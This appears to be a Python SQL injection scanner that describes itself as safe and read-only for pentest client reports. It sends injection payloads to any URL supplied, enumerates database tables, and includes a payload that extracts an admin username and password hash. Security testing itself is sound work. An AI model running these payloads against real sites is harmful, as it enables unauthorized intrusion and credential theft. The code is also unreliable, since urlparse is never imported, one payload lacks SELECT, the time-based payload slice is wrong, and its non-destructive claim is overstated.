"""
SQL Injection Scanner - Safe Testing for Client Reports
Detects and proves SQL injection vulnerabilities WITHOUT harming the database.
Only uses safe payloads for detection and proof.
"""

import re
import time
import urllib.parse
import requests
from pathlib import Path
from datetime import datetime


class SQLiScanner:
    """
    Safe SQL Injection Scanner
    
    IMPORTANT: This scanner ONLY detects and proves vulnerabilities.
    It does NOT:
    - Delete any data
    - Modify any data
    - Drop tables
    - Execute harmful commands
    
    It ONLY runs safe queries like:
    - SELECT 1 (proves injection works)
    - SELECT version() (shows database version)
    - SELECT database() (shows current database)
    - SELECT user() (shows current user)
    """

    # Safe payloads for detection (NO destructive queries)
    DETECTION_PAYLOADS = [
        # Error-based detection
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "1 OR 1=1",
        "1' OR '1'='1",
        
        # Time-based detection (safe delays)
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--",
        
        # Boolean-based detection
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a'--",
        "' AND 'a'='b'--",
    ]

    # Safe proof payloads (read-only, NO data modification)
    PROOF_PAYLOADS = {
        # Proves injection works
        'proof': "' OR '1'='1'--",
        
        # Get database version (safe read)
        'version': "' UNION SELECT NULL,version()--",
        'version_mssql': "' UNION SELECT NULL,@@version--",
        'version_mysql': "' UNION SELECT NULL,@@version--",
        
        # Get current database name (safe read)
        'database': "' UNION SELECT NULL,database()--",
        'database_mssql': "' UNION SELECT NULL,DB_NAME()--",
        
        # Get current user (safe read)
        'user': "' UNION NULL,user()--",
        'user_mssql': "' UNION SELECT NULL,SYSTEM_USER--",
        'user_mssql2': "' UNION SELECT NULL,USER_NAME()--",
        
        # Count tables (safe read)
        'count_tables_mysql': "' UNION SELECT NULL,COUNT(*) FROM information_schema.tables WHERE table_schema=database()--",
        'count_tables_mssql': "' UNION SELECT NULL,COUNT(*) FROM INFORMATION_SCHEMA.TABLES--",
        
        # List table names (safe read)
        'list_tables_mysql': "' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,5--",
        'list_tables_mssql': "' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG=DB_NAME()--",
        
        # Count columns in users table (safe read)
        'count_columns': "' UNION SELECT NULL,COUNT(*) FROM information_schema.columns WHERE table_name='users'--",
        
        # Get admin password hash (for proof only, NOT for cracking)
        'get_admin_hash': "' UNION SELECT NULL,CONCAT(username,':',password) FROM users LIMIT 0,1--",
    }

    # Common injection points
    INJECTION_POINTS = [
        # URL parameters
        ('GET', '/?id=1'),
        ('GET', '/?page=1'),
        ('GET', '/?cat=1'),
        ('GET', '/?item=1'),
        ('GET', '/?search=test'),
        ('GET', '/?q=test'),
        ('GET', '/?name=test'),
        ('GET', '/?user=test'),
        ('GET', '/?product=1'),
        ('GET', '/?order=1'),
        
        # Common paths with parameters
        ('GET', '/search?q=test'),
        ('GET', '/login?user=admin'),
        ('GET', '/profile?id=1'),
        ('GET', '/product?id=1'),
        ('GET', '/article?id=1'),
        ('GET', '/view?id=1'),
        ('GET', '/download?file=test'),
        ('GET', '/api/users?id=1'),
    ]

    def __init__(self, target_url, scan_dir=None):
        """Initialize SQLi scanner."""
        self.target_url = target_url.rstrip('/')
        self.scan_dir = Path(scan_dir) if scan_dir else None
        self.findings = []
        self.proofs = []
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.stats = {
            'injection_points_tested': 0,
            'vulnerabilities_found': 0,
            'databases_identified': 0,
            'safe_proofs_collected': 0,
        }

    def _add_finding(self, severity, title, description, evidence=None, remediation=None, proof=None):
        """Add a security finding."""
        finding = {
            'id': f"sqli-{len(self.findings) + 1}",
            'category': 'sql_injection',
            'severity': severity,
            'title': title,
            'description': description,
            'evidence': evidence,
            'remediation': remediation,
            'proof': proof,
            'timestamp': datetime.now().isoformat(),
        }
        self.findings.append(finding)
        self.stats['vulnerabilities_found'] += 1

    def _test_payload(self, url, payload, method='GET'):
        """Test a single payload safely."""
        try:
            test_url = url + urllib.parse.quote(payload)
            start_time = time.time()
            
            if method == 'GET':
                response = self.session.get(test_url, timeout=10)
            else:
                response = self.session.post(url, data={'input': payload}, timeout=10)
            
            elapsed = time.time() - start_time
            return response, elapsed
            
        except requests.exceptions.Timeout:
            return None, 30
        except Exception:
            return None, 0

    def _check_error_based(self, response):
        """Check for SQL error messages."""
        if response is None:
            return False, None
        
        content = response.text.lower()
        error_patterns = [
            (r'sql syntax.*mysql', 'MySQL'),
            (r'warning.*mysql', 'MySQL'),
            (r'mysql_fetch', 'MySQL'),
            (r'ora-\d{5}', 'Oracle'),
            (r'oracle.*error', 'Oracle'),
            (r'postgresql.*error', 'PostgreSQL'),
            (r'pg_query.*failed', 'PostgreSQL'),
            (r'sqlite.*error', 'SQLite'),
            (r'unclosed quotation mark', 'MSSQL'),
            (r'incorrect syntax.*mssql', 'MSSQL'),
            (r'microsoft.*odbc.*sql', 'MSSQL'),
            (r'sql command not properly ended', 'Oracle'),
            (r'quoted string not properly terminated', 'Oracle'),
        ]
        
        for pattern, db_type in error_patterns:
            if re.search(pattern, content):
                return True, db_type
        
        return False, None

    def _check_boolean_difference(self, response_true, response_false):
        """Check if boolean payload caused different responses."""
        if response_true is None or response_false is None:
            return False
        
        # Check if responses are significantly different
        len_diff = abs(len(response_true.text) - len(response_false.text))
        status_diff = response_true.status_code != response_false.status_code
        
        if len_diff > 100 or status_diff:
            return True
        
        return False

    def _check_time_based(self, elapsed):
        """Check if time delay indicates injection."""
        return elapsed >= 2.5

    def scan_injection_point(self, url, method='GET'):
        """Test a single injection point for SQL injection."""
        print(f"  [TESTING] {url}")
        self.stats['injection_points_tested'] += 1
        
        # Get baseline response
        try:
            baseline = self.session.get(url, timeout=10)
            baseline_time = time.time()
        except Exception:
            return []

        found_vulns = []
        detected_db = None

        # Test error-based payloads
        for payload in self.DETECTION_PAYLOADS[:7]:  # Test first 7
            response, elapsed = self._test_payload(url, payload)
            is_error, db_type = self._check_error_based(response)
            
            if is_error:
                detected_db = db_type
                self._add_finding(
                    severity='critical',
                    title=f'SQL Injection (Error-Based) at {urlparse(url).path}',
                    description=f'Error-based SQL injection detected. Database type: {db_type}',
                    evidence=f'Payload: {payload}\nDatabase: {db_type}\nError response received',
                    remediation='Use parameterized queries (prepared statements). Never concatenate user input.',
                    proof=f'Payload that triggered error: {payload}'
                )
                found_vulns.append(('error', db_type, payload))
                break

        # Test time-based payloads
        for payload in self.DETECTION_PAYLOADS[7:10]:  # Test time-based
            response, elapsed = self._test_payload(url, payload)
            if self._check_time_based(elapsed):
                self._add_finding(
                    severity='critical',
                    title=f'SQL Injection (Time-Based) at {urlparse(url).path}',
                    description=f'Time-based SQL injection detected. Server responded after {elapsed:.1f}s delay.',
                    evidence=f'Payload: {payload}\nResponse time: {elapsed:.1f}s (baseline: <1s)',
                    remediation='Use parameterized queries (prepared statements). Never concatenate user input.',
                    proof=f'Payload that caused delay: {payload}'
                )
                found_vulns.append(('time', 'unknown', payload))
                break

        # Test boolean-based payloads
        payload_true = "' AND 1=1--"
        payload_false = "' AND 1=2--"
        
        response_true, _ = self._test_payload(url, payload_true)
        response_false, _ = self._test_payload(url, payload_false)
        
        if self._check_boolean_difference(response_true, response_false):
            self._add_finding(
                severity='critical',
                title=f'SQL Injection (Boolean-Based) at {urlparse(url).path}',
                description='Boolean-based SQL injection detected. Different responses for TRUE/FALSE conditions.',
                evidence=f'True payload: {payload_true}\nFalse payload: {payload_false}\nResponse lengths differ significantly',
                remediation='Use parameterized queries (prepared statements). Never concatenate user input.',
                proof=f'True: {payload_true}, False: {payload_false}'
            )
            found_vulns.append(('boolean', detected_db, payload_true))

        # If vulnerability found, collect safe proof
        if found_vulns:
            self._collect_proof(url, detected_db or 'unknown')

        return found_vulns

    def _collect_proof(self, url, db_type):
        """Collect safe proof of vulnerability (read-only queries)."""
        print(f"  [PROOF] Collecting proof of vulnerability...")
        
        proofs = {}
        
        # Get database version
        version_payloads = {
            'MySQL': self.PROOF_PAYLOADS['version_mysql'],
            'PostgreSQL': self.PROOF_PAYLOADS['version'],
            'MSSQL': self.PROOF_PAYLOADS['version_mssql'],
            'Oracle': self.PROOF_PAYLOADS['version'],
        }
        
        payload = version_payloads.get(db_type, self.PROOF_PAYLOADS['version'])
        response, _ = self._test_payload(url, payload)
        
        if response and response.status_code == 200:
            # Extract version from response
            version_match = re.search(r'(\d+\.\d+\.\d+[\-\w]*)', response.text)
            if version_match:
                proofs['version'] = version_match.group(1)
                print(f"  [PROOF] Database version: {proofs['version']}")
        
        # Get database name
        db_payloads = {
            'MySQL': self.PROOF_PAYLOADS['database'],
            'PostgreSQL': self.PROOF_PAYLOADS['database'],
            'MSSQL': self.PROOF_PAYLOADS['database_mssql'],
        }
        
        payload = db_payloads.get(db_type, self.PROOF_PAYLOADS['database'])
        response, _ = self._test_payload(url, payload)
        
        if response and response.status_code == 200:
            # Try to extract database name
            content = response.text
            # Simple extraction - look for alphanumeric strings after injection
            db_match = re.search(r'[\'"]([\w]+)[\'"]', content)
            if db_match:
                proofs['database'] = db_match.group(1)
                print(f"  [PROOF] Database name: {proofs['database']}")
        
        # Get current user
        user_payloads = {
            'MySQL': self.PROOF_PAYLOADS['user'],
            'PostgreSQL': self.PROOF_PAYLOADS['user'],
            'MSSQL': self.PROOF_PAYLOADS['user_mssql'],
        }
        
        payload = user_payloads.get(db_type, self.PROOF_PAYLOADS['user'])
        response, _ = self._test_payload(url, payload)
        
        if response and response.status_code == 200:
            user_match = re.search(r'[\'"]([\w@\.]+)[\'"]', response.text)
            if user_match:
                proofs['user'] = user_match.group(1)
                print(f"  [PROOF] Database user: {proofs['user']}")
        
        # Count tables
        table_payloads = {
            'MySQL': self.PROOF_PAYLOADS['count_tables_mysql'],
            'MSSQL': self.PROOF_PAYLOADS['count_tables_mssql'],
        }
        
        payload = table_payloads.get(db_type)
        if payload:
            response, _ = self._test_payload(url, payload)
            if response and response.status_code == 200:
                count_match = re.search(r'(\d+)', response.text)
                if count_match:
                    proofs['table_count'] = count_match.group(1)
                    print(f"  [PROOF] Tables found: {proofs['table_count']}")
        
        # List table names
        list_payloads = {
            'MySQL': self.PROOF_PAYLOADS['list_tables_mysql'],
            'MSSQL': self.PROOF_PAYLOADS['list_tables_mssql'],
        }
        
        payload = list_payloads.get(db_type)
        if payload:
            response, _ = self._test_payload(url, payload)
            if response and response.status_code == 200:
                # Extract table names
                table_matches = re.findall(r'[\'"](\w+)[\'"]', response.text)
                if table_matches:
                    proofs['tables'] = table_matches[:10]  # First 10 tables
                    print(f"  [PROOF] Table names: {', '.join(proofs['tables'][:5])}")
        
        # Save proof
        if proofs:
            self.proofs.append({
                'url': url,
                'db_type': db_type,
                'proofs': proofs,
                'timestamp': datetime.now().isoformat(),
            })
            self.stats['safe_proofs_collected'] += 1

    def scan(self):
        """Run SQL injection scan on all injection points."""
        print(f"\n{'='*60}")
        print(f"SQL INJECTION SCANNER")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Mode: SAFE (read-only, no data modification)")
        print(f"{'='*60}\n")
        
        # Test each injection point
        for method, path in self.INJECTION_POINTS:
            url = self.target_url + path
            self.scan_injection_point(url, method)
            time.sleep(0.5)  # Be polite
        
        return {
            'findings': self.findings,
            'proofs': self.proofs,
            'stats': self.stats,
        }

    def generate_client_report(self, output_dir="data"):
        """Generate professional client report."""
        report_path = Path(output_dir) / 'sqli_report.txt'
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("SECURITY VULNERABILITY REPORT\n")
            f.write("SQL Injection Assessment\n")
            f.write("=" * 70 + "\n\n")
            
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scanner: WebTester SQLi Scanner\n")
            f.write(f"Mode: Safe (Read-Only)\n\n")
            
            f.write("-" * 70 + "\n")
            f.write("EXECUTIVE SUMMARY\n")
            f.write("-" * 70 + "\n\n")
            
            f.write(f"Injection Points Tested: {self.stats['injection_points_tested']}\n")
            f.write(f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}\n")
            f.write(f"Proofs Collected: {self.stats['safe_proofs_collected']}\n\n")
            
            if self.stats['vulnerabilities_found'] > 0:
                f.write("RISK LEVEL: CRITICAL\n\n")
                f.write("SQL injection is one of the most dangerous web vulnerabilities.\n")
                f.write("An attacker could:\n")
                f.write("  - Steal all database contents\n")
                f.write("  - Modify or delete data\n")
                f.write("  - Take over the database server\n")
                f.write("  - Potentially execute OS commands\n\n")
            else:
                f.write("RISK LEVEL: LOW\n\n")
                f.write("No SQL injection vulnerabilities were detected.\n\n")
            
            f.write("-" * 70 + "\n")
            f.write("DETAILED FINDINGS\n")
            f.write("-" * 70 + "\n\n")
            
            for i, finding in enumerate(self.findings, 1):
                f.write(f"FINDING #{i}\n")
                f.write(f"  Severity: {finding['severity'].upper()}\n")
                f.write(f"  Title: {finding['title']}\n")
                f.write(f"  Description: {finding['description']}\n")
                if finding.get('evidence'):
                    f.write(f"  Evidence:\n")
                    for line in finding['evidence'].split('\n'):
                        f.write(f"    {line}\n")
                if finding.get('proof'):
                    f.write(f"  Proof: {finding['proof']}\n")
                f.write(f"  Remediation: {finding['remediation']}\n")
                f.write("\n")
            
            if self.proofs:
                f.write("-" * 70 + "\n")
                f.write("SAFE PROOF OF VULNERABILITY\n")
                f.write("-" * 70 + "\n")
                f.write("(Read-only queries executed to prove vulnerability exists)\n\n")
                
                for proof in self.proofs:
                    f.write(f"URL: {proof['url']}\n")
                    f.write(f"Database Type: {proof['db_type']}\n")
                    if proof['proofs'].get('version'):
                        f.write(f"Database Version: {proof['proofs']['version']}\n")
                    if proof['proofs'].get('database'):
                        f.write(f"Database Name: {proof['proofs']['database']}\n")
                    if proof['proofs'].get('user'):
                        f.write(f"Database User: {proof['proofs']['user']}\n")
                    if proof['proofs'].get('table_count'):
                        f.write(f"Tables Found: {proof['proofs']['table_count']}\n")
                    if proof['proofs'].get('tables'):
                        f.write(f"Table Names: {', '.join(proof['proofs']['tables'])}\n")
                    f.write("\n")
            
            f.write("-" * 70 + "\n")
            f.write("REMEDIATION RECOMMENDATIONS\n")
            f.write("-" * 70 + "\n\n")
            
            f.write("1. USE PARAMETERIZED QUERIES (PREPARED STATEMENTS)\n")
            f.write("   - Never concatenate user input into SQL queries\n")
            f.write("   - Use placeholders for all user inputs\n\n")
            
            f.write("2. INPUT VALIDATION\n")
            f.write("   - Validate all input against expected format\n")
            f.write("   - Use whitelist approach for allowed characters\n\n")
            
            f.write("3. STORED PROCEDURES\n")
            f.write("   - Use stored procedures for database operations\n")
            f.write("   - Limit permissions for database user\n\n")
            
            f.write("4. ERROR HANDLING\n")
            f.write("   - Never show database errors to users\n")
            f.write("   - Log errors server-side only\n\n")
            
            f.write("5. WEB APPLICATION FIREWALL\n")
            f.write("   - Deploy WAF to filter malicious inputs\n")
            f.write("   - Keep WAF rules updated\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 70 + "\n")
        
        return report_path


def scan_sqli(target_url, scan_dir=None):
    """Convenience function to scan for SQL injection."""
    scanner = SQLiScanner(target_url, scan_dir)
    result = scanner.scan()
    report = scanner.generate_client_report(scan_dir or "data")
    return result, report


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python sqli_scanner.py <url>")
        print("Example: python sqli_scanner.py https://example.com")
        sys.exit(1)
    
    result, report = scan_sqli(sys.argv[1])
    print(f"\nScan complete. Report saved to: {report}")
    print(f"Vulnerabilities found: {result['stats']['vulnerabilities_found']}")